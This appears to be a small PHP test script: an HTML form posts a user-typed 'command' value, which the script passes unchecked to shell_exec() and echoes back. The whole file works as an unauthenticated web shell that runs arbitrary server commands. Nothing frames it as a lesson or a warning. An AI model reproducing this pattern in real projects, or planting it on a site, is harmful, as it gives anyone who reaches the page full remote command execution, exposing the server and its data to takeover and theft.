<form action="shellExecTest.php" method="post">
command? <input type="text" name="command">
<input type="submit">
</form>

<?php

$command = $_POST['command'];
echo "<pre>";
echo shell_exec($command);
echo "</pre>";

?>